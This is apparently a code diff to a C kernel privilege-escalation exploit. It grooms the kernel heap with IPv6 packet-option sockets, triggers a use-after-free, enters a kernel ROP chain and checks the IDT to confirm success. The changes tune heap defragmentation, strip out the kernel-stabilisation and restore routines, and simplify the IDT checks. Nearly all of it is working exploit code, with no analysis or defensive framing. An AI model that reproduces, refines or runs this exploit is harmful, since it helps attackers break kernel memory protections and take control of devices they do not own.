@@ -30,14 +30,13 @@
 
 #define MAX_ATTEMPTS 10
 #define HEAP_GROOM_COUNT 100
-#define STABILIZATION_PASSES 3
 #define AGGRESSIVE_RECLAIM_PASSES 5
 #define AGGRESSIVE_SOCKETS_PER_PASS 256
 #define POST_KROP_CLEANUP_PASSES 4
 
 #define DEFRAG_PASSES 3
 #define DEFRAG_SMALL_SOCKETS 32
-#define DEFRAG_LARGE_SOCKETS 32
+#define DEFRAG_LARGE_SOCKETS 64
 #define PKTOPTS_OBJ_SIZE 0x60
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
@@ -188,26 +187,6 @@ void comprehensive_cleanup(exploit_state_t* state) {
     nanosleep(NANOSLEEP_100US, NULL);
 }
 
-void stabilize_kernel_memory() {
-    for (int j = 0; j < STABILIZATION_PASSES; j++) {
-        int stabilization_sockets[64];
-
-        for (int i = 0; i < 64; i++) {
-            stabilization_sockets[i] = fast_new_socket();
-            if (stabilization_sockets[i] >= 0) {
-                reset_ipv6_opts(stabilization_sockets[i]);
-            }
-        }
-
-        nanosleep(NANOSLEEP_10US, NULL);
-
-        for (int i = 63; i >= 0; i--) {
-            cache_socket(stabilization_sockets[i]);
-        }
-
-        nanosleep(NANOSLEEP_10US, NULL);
-    }
-}
 
 struct opaque {
     volatile int triggered;
@@ -412,65 +391,22 @@ void flush_ipv6_option_pools() {
     nanosleep(NANOSLEEP_10US, NULL);
 }
 
-void validate_and_repair_kernel_structures() {
-    for (int check_pass = 0; check_pass < 3; check_pass++) {
-        unsigned long long current_idt_base;
-        unsigned short current_idt_size;
 
-        sidt(&current_idt_base, &current_idt_size);
-
-        if (current_idt_size < 0xFE || current_idt_base == 0) {
-            aggressive_heap_reclamation();
-            flush_ipv6_option_pools();
-        } else {
-            break;
-        }
-    }
-}
-
-int verify_idt(unsigned long long expected_base) {
+int verify_idt(void) {
     unsigned long long current_base;
     unsigned short current_size;
     sidt(&current_base, &current_size);
-    return (current_base == expected_base);
+    return (current_size >= 0xFF && current_base != 0);
 }
 
-int idt_check(uint64_t original_base) {
-    unsigned long long current_base;
-    unsigned short current_size;
-    sidt(&current_base, &current_size);
-    (void)original_base; // Parameter kept for API compatibility
-    return (current_size >= 0xFF);
-}
 
-void restore_kernel_state() {
-    for (int restoration_attempts = 0; restoration_attempts < 5; restoration_attempts++) {
-        unsigned long long current_base;
-        unsigned short current_size;
-        sidt(&current_base, &current_size);
+void targeted_heap_defragmentation(void) {
+    char pktopts_buf[PKTOPTS_OBJ_SIZE] = {0};
+    char pressure_buf[PKTOPTS_OBJ_SIZE] = {0};
 
-        if (current_size >= 0xFF && current_base != 0) {
-            break;
-        }
-
-        if (restoration_attempts >= 2) {
-            aggressive_heap_reclamation();
-            flush_ipv6_option_pools();
-        } else {
-            stabilize_kernel_memory();
-        }
-
-        nanosleep(NANOSLEEP_10US, NULL);
-    }
-}
-
-void targeted_heap_defragmentation(int target_size) {
-    (void)target_size;
     for (int pass = 0; pass < DEFRAG_PASSES; pass++) {
         int defrag_small[DEFRAG_SMALL_SOCKETS];
         int defrag_large[DEFRAG_LARGE_SOCKETS];
-
-        char pktopts_buf[PKTOPTS_OBJ_SIZE] = {0};
 
         for (int i = 0; i < DEFRAG_SMALL_SOCKETS; i++) {
             defrag_small[i] = fast_new_socket();
@@ -478,10 +414,11 @@ void targeted_heap_defragmentation(int target_size) {
                 set_pktopts(defrag_small[i], pktopts_buf, PKTOPTS_OBJ_SIZE);
                 set_rthdr(defrag_small[i], pktopts_buf, PKTOPTS_OBJ_SIZE);
             }
+        }
 
+        for (int i = 0; i < DEFRAG_LARGE_SOCKETS; i++) {
             defrag_large[i] = socket(AF_INET6, SOCK_STREAM, 0);
             if (defrag_large[i] >= 0) {
-                char pressure_buf[PKTOPTS_OBJ_SIZE] = {0};
                 setsockopt(defrag_large[i], IPPROTO_IPV6,
                            IPV6_2292PKTOPTIONS, pressure_buf, PKTOPTS_OBJ_SIZE);
             }
@@ -534,8 +471,6 @@ int main() {
 
     if (!setuid(0))
         return 179;
-
-    save_kernel_state();
 
     for (int i = 0; i < 16; i++)
         fast_new_socket();
@@ -598,7 +533,7 @@ int main() {
         }
 
         // Phase 3 - DEFRAG
-        targeted_heap_defragmentation(256);
+        targeted_heap_defragmentation();
 
         trigger_uaf(&o);
         set_tclass(master_sock, TCLASS_TAINT);
@@ -645,11 +580,11 @@ int main() {
 
         set_pktinfo(master_sock, buf);
 
-        if (!verify_idt(idt_base)) continue;
+        if (!verify_idt()) continue;
 
         enter_krop();
 
-        if (!idt_check(idt_base)) continue;
+        if (!verify_idt()) continue;
 
         exploit_success = 1;
         nanosleep(NANOSLEEP_50US, NULL);
@@ -691,12 +626,6 @@ int main() {
 
             nanosleep(NANOSLEEP_100US, NULL);
         }
-    }
-
-    validate_and_repair_kernel_structures();
-
-    if (!idt_check(idt_base)) {
-        restore_kernel_state();
     }
 
     comprehensive_cleanup(&cleanup_state);
